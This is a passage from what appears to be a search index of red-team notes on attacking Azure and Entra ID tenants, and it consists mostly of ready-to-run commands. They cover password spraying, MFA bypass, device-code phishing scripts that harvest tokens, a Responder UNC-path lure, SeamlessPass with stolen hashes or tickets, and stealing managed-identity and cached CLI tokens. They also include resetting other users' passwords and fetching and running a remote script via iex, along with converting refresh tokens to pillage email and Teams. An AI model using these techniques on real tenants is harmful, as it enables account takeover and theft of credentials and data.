--silent 'https://azservicetags.azurewebsites.net/api/iplookup?ipAddresses=20.75.112.13' | jq\n</code></pre>"},{"location":"Azure/group_abuse/","title":"Group abuse","text":""},{"location":"Azure/group_abuse/#enumeration","title":"Enumeration","text":""},{"location":"Azure/group_abuse/#azure-cli","title":"Azure CLI","text":"<p>List groups <pre><code>az ad group list\n</code></pre></p> <p>Get group information <pre><code>az ad group show --group &lt;name&gt;\n</code></pre></p> <p>Get groups from EntraID <pre><code>az ad group list --query \"[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi==null]\"\n</code></pre></p> <p>Get synced users from on-prem <pre><code>az ad group list --query \"[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi!=null]\"\n</code></pre></p> <p>Get group members <pre><code>az ad group member list --group &lt;group-name&gt; --query \"[].userPrincipalName\" -o table\n</code></pre></p> <p>Get which groups a group is member of <pre><code>az ad group get-member-groups -g \"&lt;group-name&gt;\"\n</code></pre></p> <p>Get roles assigned to the group in Azure (NOT in Entra ID) <pre><code>az role assignment list --include-groups --include-classic-administrators true --assignee &lt;group-id&gt;\n</code></pre></p> <p>List users group membership <pre><code>Get-MgUserMemberOf -userid \"user@domain.com\" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties[\"displayName\"]}\n</code></pre></p> <p>Get objectID from group name <pre><code>az ad group show --group \"My Group Display Name\" --query id --output tsv\n</code></pre></p> <pre><code>(Get-MgGroup -Filter \"DisplayName eq 'My Group Display Name'\").Id\n</code></pre> <p>get custom role defenitions (list all properties) <pre><code>az role definition list --custom-role-only true --query \"[?roleName=='Role Name']\" -o json\n</code></pre></p>"},{"location":"Azure/group_abuse/#graphrunnerps1","title":"GraphRunner.ps1","text":"<p>Enum Dynamic Groups</p> <pre><code>Get-DynamicGroups -Tokens $tokens\n</code></pre> <p>Enum groupd ID </p> <pre><code>Get-SecurityGroups -Tokens $tokens\n</code></pre> <p>Enum UserID</p> <pre><code>Get-UserObjectID -Tokens $tokens user.one@domain.com\n</code></pre> <p>Add user to group</p> <pre><code>Invoke-AddGroupMember -groupId &lt;groupid&gt; -userId &lt;userid&gt;\n</code></pre>"},{"location":"Azure/group_abuse/#bark","title":"BARK","text":"<p>https://github.com/BloodHoundAD/BARK</p> <p>Enumerate Entra groups and info about them</p> <pre><code>$Groups = Get-AllEntraGroups\n$Group = $Groups | Where-Object { $_.DisplayName -eq \"&lt;interesting group&gt;\" }\n$Group\n</code></pre>"},{"location":"Azure/group_abuse/#interesting-groups","title":"Interesting Groups","text":""},{"location":"Azure/group_abuse/#directory-readers","title":"Directory Readers","text":"<ul> <li>Allows Entra enumeration </li> </ul>"},{"location":"Azure/managed_identity_and_apps/","title":"Managed identity and apps","text":"<p>If a resource needs access to another system, such as a webapp needed database access, you can give it a \"managed identity\" which allows it to auth to another resource.</p>"},{"location":"Azure/managed_identity_and_apps/#enumeration","title":"Enumeration","text":""},{"location":"Azure/managed_identity_and_apps/#azure-cli","title":"Azure CLI","text":"<p>List all applications <pre><code>az ad app list\naz ad app list --query \"[].[displayName,appId]\" -o table\n</code></pre></p> <p>Get app information <pre><code>az ad app show --id &lt;app-id&gt;\n</code></pre></p> <p>Search apps by name <pre><code>az ad app list --all --query \"[?contains(displayName,'Test')].displayName\"\n</code></pre></p> <p>Get owner of an app <pre><code>az ad app owner list --id &lt;app-id&gt; --query \"[].[displayName]\" -o table\n</code></pre></p> <p>Get apps owned by current user <pre><code>az ad app list --show-mine\n</code></pre></p> <p>Get apps generated with a secret or certificate <pre><code>az ad app list --query '[?length(keyCredentials) &gt; `0` || length(passwordCredentials) &gt; `0`].[displayName, appId, keyCredentials, passwordCredentials]' -o json\n</code></pre></p> <p>Get all managed identities with their SP <pre><code>az identity list --output table\n</code></pre></p>"},{"location":"Azure/managed_identity_and_apps/#identify","title":"Identify","text":"<p>If you get code exec on a resource, check environment variables for <pre><code>IDENTITY_HEADER=\nIDENTITY_ENDPOINT=\n\nor\n\nMSI_ENDPOINT=\nMSI_SECRET=\n</code></pre></p>"},{"location":"Azure/managed_identity_and_apps/#exploit","title":"Exploit","text":"<p>You can use these two env vars to request an access token from the azure metadata provider for the azure management api.</p> <pre><code>curl -H \"X-IDENTITY-HEADER: $IDENTITY_HEADER $IDENTITY_ENDPOINT?\nresource=https://management.azure.com&amp;api-version=2019-08-01\"\n</code></pre> <p>or for azure vault <pre><code>curl -s -H \"X-Identity-Header: $IDENTITY_HEADER\n$IDENTITY_ENDPOINT?api-version=2019-08-\n01&amp;resource=https://vault.azure.net\"\n</code></pre></p> <p>Then, decode the JWT to understand for about the permissions. </p> <p>Auth with token <pre><code>$accesstoken = \"&lt;YOUR-TOKEN&gt;\"\n$accountid = \"is required but not validated\"\nConnect-AzAccount -AccessToken $accesstoken -AccountID $accountid\n</code></pre></p> <p>Check access <pre><code>Get-AzResource\n</code></pre></p>"},{"location":"Azure/mfa/","title":"Mfa","text":""},{"location":"Azure/mfa/#identify-mfa-gaps","title":"Identify MFA Gaps","text":"<p>With MFASweep https://github.com/dafthack/MFASweep</p> <p>Attempt to authenticate to the </p> <ul> <li>Microsoft Graph API</li> <li>Azure Service Management API</li> <li>Microsoft 365 Exchange Web Services</li> <li>Microsoft 365 Web Portal with both a desktop browser and mobile.</li> <li>Microsoft 365 Active Sync</li> </ul> <p>If any authentication methods result in success, tokens and/or cookies will be written to AccessTokens.json. (Currently does not log cookies or tokens for EWS, ActiveSync, and ADFS) <pre><code>. .\\MFASweep.ps1\nInvoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2024 -WriteTokens \n</code></pre></p> <pre><code>Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2024 -Recon\n</code></pre> <p>[!NOTE] Note The user agents in MFA sweep are static and actually unique (on purpose). They should be changed. </p> <p>Dumping Conditional Access Policies</p> <p>[!NOTE] Deprecation The AADGraph api is now deprecated and normal users are unable to query the policy</p> <p>Have user? Try to dump conditional access policies to check MFA policies.</p> <pre><code>. .\\GraphRunner.ps1\nInvoke-DumpCaps\n</code></pre> <p>RoadRECON https://github.com/dirkjanm/ROADtools <pre><code>roadrecon plugin policies \nfirefox ./caps.html\n</code></pre></p> <p>with Curl:</p> <pre><code>curl -sSf -H \"Authorization: Bearer $aadgraphtoken\" 'https://graph.windows.net/&lt;tenantID&gt;/policies?api-version=1.61-internal' | jq\n</code></pre>"},{"location":"Azure/mfa/#bypass-methods","title":"Bypass Methods","text":""},{"location":"Azure/mfa/#device-based","title":"Device Based","text":"<p>https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-conditions#device-platforms</p> <p>OS allow listing: Sometimes tenants will be configured to bypass MFA for a particular OS (in the case of automation systems, breakglass accounts, etc...)</p> <p>GraphRunner</p> <pre><code>Get-GraphTokens -Device &lt;Mac,AndroidMobile,etc...&gt;\n</code></pre>"},{"location":"Azure/mfa/#phishing","title":"Phishing","text":"<p>[[phishing#Evilginx]]</p>"},{"location":"Azure/misc_commands/","title":"Misc commands","text":"<p>Login with az cli <pre><code>az login \n</code></pre></p> <p>or with just user and pass <pre><code>az login -u user.one@domain.com -p Password123!\n</code></pre></p> <p>With service principal <pre><code>az login --service-principal -u clientid -p 'clientsecret' --tenant test.azuretnenat.com\n</code></pre></p> <p>Powershell: <pre><code>Install-Module Microsoft.Graph\nInstall-Module Az\nImport-Module Microsoft.Graph.Users\nImport-Module Az\n</code></pre></p> <p>login to  azure <pre><code>Connect-AzAccount\n</code></pre></p> <p>or with device code <pre><code>Connect-AzAccount -AccountId \"email@domain.com\" -UseDeviceAuthentication\n</code></pre></p> <p>login to graph <pre><code>Connect-MgGraph\n</code></pre></p> <p>Validate login:</p> <p>azure : <pre><code>az account show\n</code></pre></p> <p>graph <pre><code>az ad signed-in-user show\n</code></pre></p> <p>Start graph session from azure resource manager session <pre><code>Connect-MgGraph\n</code></pre></p> <p>whoami but for graph <pre><code>Get-MgContext\n</code></pre></p> <p>logout</p> <pre><code>az logout\n</code></pre> <pre><code>Disconnect-AzAccount\n</code></pre>"},{"location":"Azure/on-prem_to_cloud/","title":"On prem to cloud","text":""},{"location":"Azure/on-prem_to_cloud/#ntdsdit","title":"NTDS.dit","text":"<p>If a company is using Entra Connect Sync for there hybrid infra, credentials are mirrored in the cloud. If you compromise an on prem environment and dump the ntds.dit, you can identify users that may have azure access for example: <pre><code>DOMAIN.LOCAL\\administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;&gt;::: &lt;-- local user\n\ndomain.com\\Yimel.Naders:2603:aad3b435b51404eeaad3b435b51404ee:&lt;&gt;::: &lt;-- azure user (the domain is the azure tenant)\n</code></pre></p> <p>Probably [[mfa]] next.</p>"},{"location":"Azure/on-prem_to_cloud/#seamless-pass","title":"Seamless pass","text":"<p>For organizations with Seamless SSO (Desktop SSO) enabled, if we can dump tickets or hashes, we can access azure tokens even without cracking a password. https://github.com/Malcrove/SeamlessPass</p> <p>Use cases:</p> <p>Using compromised user\u2019s Ticket-Granting-Ticket (TGT) or forged Golden Ticket (Interacts with DC) <pre><code>seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt &lt;base64_encoded_TGT&gt;\n</code></pre></p> <p>Using compromised user\u2019s NTLM hash or AES key (Interacts with DC) <pre><code>seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -username user -ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF\n</code></pre></p> <p>Acquisition of AZUREADSSOACC$ account NTLM hash or AES key (No interaction with DC is needed) <pre><code>seamlesspass -tenant corp.com -adssoacc-ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF -user-sid S-1-5-21-1234567890-1234567890-1234567890-1234\n</code></pre></p>"},{"location":"Azure/password_spraying/","title":"Password spraying","text":"<p>Microsoft changes error codes and responses often, so tools often break. Its important to be tool agnostic</p>"},{"location":"Azure/password_spraying/#password-spraying","title":"Password Spraying","text":"<p>[!NOTE] Note Azure does a good job at preventing easy passwords like SeasonYear! and Password123! so it may be a waste of time to spray those. HOWEVER, by default azure does not block common passwords in languages other than english.</p> <p>MSOLSpray (powershell) https://github.com/dafthack/MSOLSpray <pre><code>Invoke-MSOLSpray -UserList user.txt -Password \"MegaDev79$\" -Verbose\n</code></pre></p> <p>CaptainCredz https://github.com/synacktiv/captaincredz <pre><code>\n</code></pre></p> <p>with oh365userfinder https://github.com/dievus/Oh365UserFinder <pre><code>python3 oh365userfinder.py -p &lt;password&gt; --pwspray --elist &lt;listname&gt;\n</code></pre></p> <p>with o365spray https://github.com/0xZDH/o365spray <pre><code>o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com\n</code></pre></p> <p>OmniSpray https://github.com/0xZDH/Omnispray</p> <p>validate users: <pre><code>python3 omnispray.py --type enum -uf users.txt --module o365_enum_office\n</code></pre></p> <p>Spray: <pre><code>python3 omnispray.py --type spray -uf users.txt -p 'MegaDev79$' --module o365_spray_msol\n</code></pre></p> <p>If you're authed, you can retrieve the password policy via graph</p> <p><pre><code>Install-Module -Name Microsoft.Graph.Identity.DirectoryManagement -Scope CurrentUser -Force\n</code></pre> <pre><code>Import-Module Microsoft.Graph.Identity.DirectoryManagement\n</code></pre></p> <p>get template id <pre><code>Get-MgGroupSetting\n</code></pre></p> <pre><code>Install-Module Microsoft.Graph.Identity.DirectoryManagement\nGet-MgDirectorySetting |where {$_.templateId -eq \"5cf42378-d67d-4f36-ba46-e8b86229381d\"} |convertto-json -Depth 50\n</code></pre>"},{"location":"Azure/phishing/","title":"Phishing","text":""},{"location":"Azure/phishing/#responder","title":"Responder","text":"<p>My organizations will block smb ingress, but not egress. Allowing an attacker to spin up responder on a public IP and capture Net-NTLMv2 hashes over the internet. </p> <p>Technique: convince user to win+r and paste UNC path into run box <pre><code>\\\\&lt;publicip&gt;\\payroll.docx\n</code></pre></p> <p>Responder should catch a hash. Try to crack!</p>"},{"location":"Azure/phishing/#evilginx","title":"Evilginx","text":""},{"location":"Azure/phishing/#device-code","title":"Device Code","text":"<p>https://aadinternals.com/post/phishing/</p>"},{"location":"Azure/phishing/#manual-approach","title":"Manual Approach","text":"<p>Make a POST with resource &amp; client_id - Client ID = ID of app you want access to list here - Resource = prolly graph if you're targeting a normal user. (Entra &amp; O365)</p> <p>powershell <pre><code>$body=@{\n    \"client_id\" = \"d3590ed6-52b3-4102-aeff-aad2292ab01c\"\n    \"resource\" =  \"https://graph.microsoft.com\"\n}\n\n$authResponse=(Invoke-RestMethod -UseBasicParsing -Method Post -Uri \"https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0\" -Body $body)\n$authResponse\n</code></pre></p> <p>or</p> <pre><code>curl -s -X POST \\  -H 'Content-Type: application/x-www-form-urlencoded' \\  -d 'client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&amp;resource=https://graph.microsoft.com' \\  \"https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0\" | jq\n</code></pre> <p>Then script to query the endpoint waiting for response, once received, it will print our access &amp; refresh token</p> <pre><code>$response = \"\"\n$continue = $true\n$interval = $authResponse.interval\n$expires =  $authResponse.expires_in\n\n$body=@{\n    \"client_id\" = \"d3590ed6-52b3-4102-aeff-aad2292ab01c\"\n    \"grant_type\" = \"urn:ietf:params:oauth:grant-type:device_code\"\n    \"code\" = $authResponse.device_code\n    \"resource\" = \"https://graph.microsoft.com\"\n}\n\nwhile($continue)\n{\n    Start-Sleep -Seconds $interval\n    $total += $interval\n\n    if($total -gt $expires)\n    {\n        Write-Error \"Timeout occurred\"\n        return\n    }\n\n    try\n    {\n        $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri \"https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 \" -Body $body -ErrorAction SilentlyContinue\n    }\n    catch\n    {\n        $details=$_.ErrorDetails.Message | ConvertFrom-Json\n        $continue = $details.error -eq \"authorization_pending\"\n        Write-Host $details.error\n\n        if(!$continue)\n        {\n            Write-Error $details.error_description\n            return\n        }\n    }\n\n    if($response)\n    {\n      break\n    }\n}\n$response.access_token\n</code></pre> <p>or</p> <pre><code>#!/bin/bash\n\nauth_interval=5\nauth_expires_in=900\nauth_device_code=\"&lt;device-code&gt;\"\n\n# MSFT Resource &amp; App:\nclient_id=\"d3590ed6-52b3-4102-aeff-aad2292ab01c\" # this is office\nresource=\"https://graph.microsoft.com\" # for entra &amp; o365\ntoken_url=\"https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0\"\ngrant_type=\"urn:ietf:params:oauth:grant-type:device_code\"\n\ncontinue_polling=true\ntotal_wait_time=0\nresponse=\"\"\n\necho \"Polling for authorization...\"\n\nwhile [ \"$continue_polling\" = true ]; do\n    sleep \"$auth_interval\"\n    total_wait_time=$((total_wait_time + auth_interval))\n\n    # Check for timeout\n    if (( total_wait_time &gt; auth_expires_in )); then\n        echo \"Error: Timeout occurred. Authorization was not completed in time.\" &gt;&amp;2\n        exit 1\n    fi\n\n    response=$(curl -sS -X POST \"$token_url\" \\\n      -d \"client_id=$client_id\" \\\n      -d \"grant_type=$grant_type\" \\\n      -d \"code=$auth_device_code\" \\\n      -d \"resource=$resource\")\n\n    if echo \"$response\" | jq -e '.error' &gt; /dev/null; then\n        error_code=$(echo \"$response\" | jq -r '.error')\n        if [ \"$error_code\" = \"authorization_pending\" ]; then\n            echo \"$error_code\"\n        else\n            error_description=$(echo \"$response\" | jq -r '.error_description')\n            echo \"Error: $error_description\" &gt;&amp;2\n            exit 1\n        fi\n    else\n        break\n    fi\ndone\n\necho \"Authorization successful!\"\necho \"$response\" | jq \n</code></pre>"},{"location":"Azure/phishing/#use-azurecli-instead","title":"Use AzureCLI instead","text":"<pre><code>az login --use-device-code\n</code></pre>"},{"location":"Azure/resource_enumeration/","title":"Resource enumeration","text":""},{"location":"Azure/resource_enumeration/#authenticated","title":"Authenticated","text":"<p>List available resources for your user <pre><code>az resource list\n</code></pre></p> <p>or with curl <pre><code>SubscriptionId='&lt;TENANTID&gt;'\nResourceUrl=\"https://management.azure.com/subscriptions/$SubscriptionId/resources\"\naccesstoken='jwtaccesstoken'\n\ncurl -X GET \"${ResourceUrl}?api-version=2020-06-01\" \\\n-H \"Authorization: Bearer $accesstoken\" \\\n-H \"Content-Type: application/json\"\n</code></pre></p> <p>Check resources your user owns <pre><code>Get-MgUserOwnedObject -UserId \"user.one@domain.com\"\n</code></pre></p> <p>Check resources your user as \"reader\" or greater access to  <pre><code>Get-AzResource\n</code></pre></p> <p>Check specific permissions. <pre><code>Get-AzRoleAssignment -SignInName user.one@domain.com\n</code></pre></p>"},{"location":"Azure/role_abuse/","title":"Role abuse","text":""},{"location":"Azure/role_abuse/#website-contributors","title":"Website Contributors","text":"<ul> <li>Access to the web apps publishing profile &amp; SCM/Kudu (env vars, ssh)</li> <li>Retrieve the FTPS deployment URL, username and password</li> </ul> <p>[[azure_webapps#Kudu / SCM]]</p>"},{"location":"Azure/role_abuse/#user-administrator","title":"User Administrator","text":"<ul> <li>typical for Help Desk and stuff</li> </ul> <p>Enumerate <pre><code>Connect-MgGraph\n</code></pre></p> <p>List admin units to identify a high privilege target <pre><code>Get-MgDirectoryAdministrativeUnit | fl\n</code></pre></p> <p>Check if that Administrative Unit has scopes roles <pre><code>Get-MgBetaDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId\n&lt;AUID&gt; | Select-Object roleMemberInfo,roleId  -ExpandProperty roleMemberInfo\n</code></pre></p> <p>Resolve the roleID <pre><code>$roleId = \"&lt;ID&gt;\"\n$directoryRoles = GetMgDirectoryRole | Where-Object { $_.Id -eq $roleId }\n$directoryRoles | Format-List *\n</code></pre></p> <p>If you have User Administrator you can reset the password of users.</p> <p>Now you know the role, grab members of that administrative unit <pre><code>Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId &lt;ID&gt; | Select * -ExpandProperty additionalProperties\n</code></pre></p> <p>Reset the password: https://github.com/BloodHoundAD/BARK</p> <p>Get BARK <pre><code>iex (iwr https://raw.githubusercontent.com/BloodHoundAD/BARK/main/BARK.ps1)\n</code></pre></p> <p>Get refresh token <pre><code>$RefreshToken = Get-EntraRefreshTokenWithUsernamePassword -username \"User1@domain.com\" -password \"passpass\" -TenantID \"&lt;tenantid&gt;\"\n</code></pre></p> <p>Set the password with BARK <pre><code>Set-EntraUserPassword -TargetUserId 'user2@domain.com' -Token $RefreshToken.access_token -Password '&lt;new_password&gt;'\n</code></pre> Will return <code>204 no content</code> - this is chill</p> <p>Login as user <pre><code>az login -u 'user2@domain.com' -p 'newpassword'\n</code></pre></p>"},{"location":"Azure/service_principals/","title":"Service principals","text":""},{"location":"Azure/service_principals/#enumeration","title":"Enumeration","text":""},{"location":"Azure/service_principals/#azure-cli","title":"Azure CLI","text":"<p>List all SPs <pre><code>az ad sp list --all\naz ad sp list --all --query \"[].[displayName,appId,servicePrincipalNames]\" -o table\n</code></pre></p> <p>Get SP info <pre><code>az ad sp show --id &lt;sp-id&gt;\n</code></pre></p> <p>Search SP by name <pre><code>az ad sp list --all --query \"[?contains(displayName,'Test')].displayName\"\n</code></pre></p> <p>Get owner of SP <pre><code>az ad sp owner list --id &lt;sp-id&gt; --query \"[].[displayName]\" -o table\n</code></pre></p> <p>Get SPs owned by current user <pre><code>az ad sp list --show-mine\n</code></pre></p> <p>Get SPs with generated secret or certificate <pre><code>az ad sp list --query '[?length(keyCredentials) &gt; `0` || length(passwordCredentials) &gt; `0`].[displayName, appId, keyCredentials, passwordCredentials]' -o json\n</code></pre></p>"},{"location":"Azure/storage/","title":"Storage","text":"<p>List storage accounts for current user <pre><code>az storage account list --query \"[].name\" -o tsv\n</code></pre></p>"},{"location":"Azure/tenant_wide_enumeration/","title":"Tenant wide enumeration","text":""},{"location":"Azure/tenant_wide_enumeration/#azurehound","title":"azurehound","text":"<p>Bloodhound for azure, graph theory bla bla bla</p> <p>Ingestor: <pre><code>azurehound -r \"&lt;refreshtoken&gt;\" list --tenant \"domain.com\" -o out.json\n</code></pre> or <pre><code>azurehound -j \"&lt;accesstoken&gt;\" list --tenant \"domain.com\" -o out.json\n</code></pre> or <pre><code>azurehound -u \"&lt;username&gt;\" -p \"&lt;password&gt;\" list --tenant \"domain.com\" -o out.json\n</code></pre></p>"},{"location":"Azure/tenant_wide_enumeration/#cyphers","title":"Cyphers","text":"<p>identify and return all relationships involving Azure Service Principals <pre><code>MATCH p = (g:AZServicePrincipal)-[r]-&gt;(n) RETURN p\n</code></pre></p> <p>display shortest path to managed identity <pre><code>MATCH (u:AZUser), (m:AZServicePrincipal {serviceprincipaltype: 'ManagedIdentity'}) MATCH p = shortestPath((u)-[*..]-&gt;(m)) RETURN p\n</code></pre></p> <p>[!NOTE] BloodHound blind spots Azure role assignments that have been assigned at a subscription, management group, resource group, or individual resource level. Role memberships are not supported if scoped to an administrative unit. You CAN see these with the az cli, powershell Az, graph api https://github.com/SpecterOps/BloodHound-Legacy/issues/677</p> <p>^^ or use [[#ROADRecon]] (still wont show admin roles scoped to admin unit)</p> <p>Work around this with shell:</p> <p>List administrative units <pre><code>Get-MgDirectoryAdministrativeUnit | f1\n</code></pre></p> <p>List scoped role members <pre><code>Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId &lt;ObjectID&gt; | Select-Object rolememberjInfo, roleId -ExpandProperty roleMemberInfo\n</code></pre></p> <p>Grab the object id and run <pre><code>Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId &lt;ObjectID&gt; | f1\n</code></pre></p> <p>Next? [[role_abuse]]</p>"},{"location":"Azure/tenant_wide_enumeration/#roadrecon","title":"ROADRecon","text":"<pre><code>pipx install roadrecon\n</code></pre> <p>ROADRecon as a million auth methods: <pre><code>roadrecon auth -h\n</code></pre></p> <p>[!NOTE] OPSEC ROADRecon lets you specify a US with <code>--user-agent</code> to easily match a target environment</p> <p>Gather info <pre><code>roadrecon gather --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3'\n</code></pre></p> <p>Access UI <pre><code>http://127.0.0.1:5000\n</code></pre></p>"},{"location":"Azure/user_enumeration/","title":"User enumeration","text":""},{"location":"Azure/user_enumeration/#unauthenticated","title":"Unauthenticated","text":"<p>Spray!</p> <p>With o365enum https://github.com/gremwell/o365enum <pre><code>o365enum.py -u userslist.txt -n 1 -m office.com\n</code></pre></p> <p>OmniSpray https://github.com/0xZDH/Omnispray <pre><code>python3 omnispray.py --type enum -uf users.txt --module o365_enum_office\n</code></pre></p>"},{"location":"Azure/user_enumeration/#authenticated","title":"Authenticated","text":""},{"location":"Azure/user_enumeration/#az-cli","title":"AZ CLI","text":"<p>Get all users <pre><code>az ad user list --query \"[].userPrincipalName\" --output tsv\n</code></pre></p> <pre><code>az ad user list --output table\n</code></pre> <p>Az Powershell get modules: <pre><code>Install-Module -Name Az -Repository PSGallery -Force\nImport-Module -Name Az\nInstall-Module -Name Microsoft.Graph -Scope CurrentUser -AllowClobber -Force\nImport-Module -Name Microsoft.Graph\n</code></pre></p> <p>Dump all users: <pre><code>Get-AzADUser\n</code></pre></p> <p>List admin users <pre><code>az ad user list --query \"[?contains(displayName,'admin')].displayName\"\n</code></pre></p> <p>Search user attributes for strings <pre><code>az ad user list | findstr /i \"password\" | findstr /v \"null,\"\n</code></pre></p> <pre><code>az ad user list | grep -i \"password\" | grep -v \"null,\"\n</code></pre> <p>Get users from Entra ID <pre><code>az ad user list --query \"[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi==null]\"\n</code></pre></p> <p>Get synced users from on-prem <pre><code>az ad user list --query \"[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi!=null]\"\n</code></pre></p> <p>Get groups where the user is a member <pre><code>az ad user get-member-groups --id &lt;email&gt;\n</code></pre></p> <p>Get roles assigned to the user in Azure (NOT in Entra ID) <pre><code>az role assignment list --include-inherited --include-groups --include-classic-administrators true --assignee &lt;email&gt;\n</code></pre></p> <p>Get ALL roles assigned in Azure in the current subscription (NOT in Entra ID) <pre><code>az role assignment list --include-groups --include-classic-administrators true --all\n</code></pre></p>"},{"location":"Azure/user_enumeration/#api","title":"API","text":"<p>Get bearer token <pre><code>export TOKEN=$(az account get-access-token --resource https://graph.microsoft.com/ --query accessToken -o tsv)\n</code></pre></p> <p>Get users <pre><code>curl -X GET \"https://graph.microsoft.com/v1.0/users\" \\ -H \"Authorization: Bearer $TOKEN\" \\ -H \"Content-Type: application/json\" | jq\n</code></pre></p> <p>Get EntraID roles assigned to user <pre><code>curl -X GET \"https://graph.microsoft.com/beta/rolemanagement/directory/transitiveRoleAssignments?\\$count=true&amp;\\$filter=principalId%20eq%20'86b10631-ff01-4e73-a031-29e505565caa'\" \\\n-H \"Authorization: Bearer $TOKEN\" \\\n-H \"ConsistencyLevel: eventual\" \\\n-H \"Content-Type: application/json\" | jq\n</code></pre></p> <p>Get role details <pre><code>curl -X GET \"https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/cf1c38e5-3621-4004-a7cb-879624dced7c\" \\\n-H \"Authorization: Bearer $TOKEN\" \\\n-H \"Content-Type: application/json\" | jq\n</code></pre></p> <p>User properties to gain context <pre><code>Get-AzADUser -UserPrincipalName 'user.one@domain.com' | fl\n</code></pre></p> <p>With GraphRunner.ps1 <pre><code>Get-AzureADUsers -Tokens $tokens -outfile users.txt\n</code></pre></p> <p>Validate enabled users <pre><code>az ad user list --query \"[?givenName=='user1' || givenName=='user2' || givenName=='user3'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}\" -o table\n</code></pre></p> <p>Get users object ID <pre><code>Get-MgUser -UserId user1@domain.com\n</code></pre></p> <p>Find role assignment.</p> <p>get tenantid <pre><code>az account show --query tenantId --output tsv\n</code></pre></p> <pre><code>(Get-AzContext).Tenant.Id\n</code></pre> <pre><code>Get-AzRoleAssignment -Scope \"/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94\" | Select-Object DisplayName, RoleDefinitionName\n</code></pre>"},{"location":"Azure/Tokens/get_tokens/","title":"Get tokens","text":""},{"location":"Azure/Tokens/get_tokens/#token-locations","title":"Token locations","text":"<p>[!NOTE] Note In non-windows devices, azure tokens are stored in plaintext</p> <p>Linux &amp; Mac (might have resource token in plaintext)</p> <pre><code>~./azure/msal_token_cache.json\n~./Azure/msal_token_cache.json\n</code></pre> <p>Windows (can export access token, but refresh token is encrypted)</p> <pre><code>C:\\Users\\user1\\.Azure\\accessTokens.json\nC:\\Users\\user1\\.azure\\msal_token_cache.bin\nC:\\Users\\user1\\.Azure\\TokensCache.dat\nC:\\Users\\user1\\AppData\\Local\\.IdentityService\\msal.cache\n</code></pre> <p>Save tokens for later use: - (if token protection is not enables, we can just move the session to our own device) <pre><code>Save-AzContext\n</code></pre></p> <p>We can use Export-AzureCliTokens / Export-AADIntAzureCliTokens function in AccessToken_utils.ps1 from AADInternals-Endpoints.</p> <pre><code>git clone https://github.com/Gerenios/AADInternals-Endpoints; cd AADInternals-Endpoints\nImport-Module .\\AADInternals-Endpoints.psm1\nImport-Module .\\CommonUtils.ps1\nImport-Module .\\AccessToken_utils.ps1\n</code></pre> <p>the refresh tokens seem not to be stored in the MSALCache. If you add Write-Output $tokens just before $objTokens = $tokens | ConvertFrom-Json in the function Export-AzureCliTokens in AccessToken_utils.ps1, we see all the AccessToken and IdToken values but no RefreshToken values</p> <p>[!NOTE] Note We can actually access the tokens if we install an older version o the azure cli</p> <pre><code>winget uninstall Microsoft.AzureCLI --all-versions\n\nInvoke-WebRequest -Uri https://azurecliprod.blob.core.windows.net/msi/azure-cli-2.3.0.msi -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\\AzureCLI.msi\n</code></pre> <p>Then we login again and see the readable tokens</p>"},{"location":"Azure/Tokens/get_tokens/#get-access-tokens","title":"Get access tokens","text":"<p>azure CLI <pre><code>az account get-access-token\naz account get-access-token --resource \"https://vault.azure.net\"\n</code></pre></p> <p>powershell <pre><code>(Get-AzAccessToken -ResourceUrl \"https://vault.azure.net\").Token\n(Get-AzAccessToken -ResourceUrl \"https://graph.microsoft.com\").Token\n</code></pre></p> <p>Get token with specific audience</p> <p>Entra ID: <pre><code>az account get-access-token --resource-type ms-graph\n</code></pre></p> <p>Azure: <pre><code>az account get-access-token --resource-type arm\n</code></pre></p>"},{"location":"Azure/Tokens/get_tokens/#got-a-refresh-token","title":"Got a refresh token?","text":"<pre><code># We can clone it e.g. If we want to easily make changes to the source code\ngit clone https://github.com/Gerenios/AADInternals-Endpoints; cd AADInternals-Endpoints\nImport-Module .\\AADInternals-Endpoints.psm1\nImport-Module .\\CommonUtils.ps1\nImport-Module .\\AccessToken_utils.ps1\n</code></pre> <pre><code>Export-AzureCliTokens | fl\n</code></pre>"},{"location":"Azure/Tokens/get_tokens/#convert-to-graph-token-and-pillage","title":"Convert to graph token and pillage","text":"<p>Convert: TokenTactics https://github.com/f-bader/TokenTacticsV2 <pre><code>. .\\TokenTactics.psm1\nRefreshTo-MSGraphToken -domain domain.com -RefreshToken '&lt;1.....&gt;'\n</code></pre> Write tokens to <code>$MSGraphToken</code> access: <code>$MSGraphToken.access_token</code></p> <p>Pillage email: [[Cloud/data_pillaging#Email|data_pillaging]]</p>"},{"location":"Azure/Tokens/get_tokens/#convert-to-msteams-token-and-pillage","title":"Convert to MSTeams token and pillage","text":"<p>Convert: TokenTactics https://github.com/f-bader/TokenTacticsV2 <pre><code>Import-Module ./TokenTactics.psm1\nRefreshTo-MSTeamsToken -domain domain.com -RefreshToken '&lt;1.....&gt;'\n</code></pre> 